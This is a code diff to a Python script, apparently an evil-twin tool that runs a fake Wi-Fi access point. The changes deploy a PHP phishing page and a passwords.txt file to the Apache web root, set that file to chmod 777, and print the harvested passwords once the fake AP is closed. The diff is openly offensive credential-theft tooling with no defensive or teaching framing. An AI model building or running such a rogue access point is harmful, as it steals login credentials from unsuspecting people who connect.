@@ -44,10 +44,13 @@ def run_AP():
 
 def start_apache():
     os.system('service apache2 start')
-    os.system('cp html/index.html /var/www/html/')
+    os.system('cp html/index.php /var/www/html/')
+    os.system('cp html/pass.php /var/www/html/')
+    os.system('cp html/passwords.txt /var/www/html/')
     os.system('cp -r html/css /var/www/html/')
     os.system('cp -r html/js /var/www/html/')
     os.system('cp -r html/images /var/www/html/')
+    os.system('chmod 777 /var/www/html/passwords.txt')
 
 
 	
@@ -59,6 +62,9 @@ def start(iface):
     run_AP()
     empty = raw_input("\nPress Enter to Close Fake Accses Point AND Power OFF the fake AP.........\n")
     reset_setting()
+    os.system("clear")
+    os.system("cat /var/www/html/passwords.txt")
+
     
 	
 	
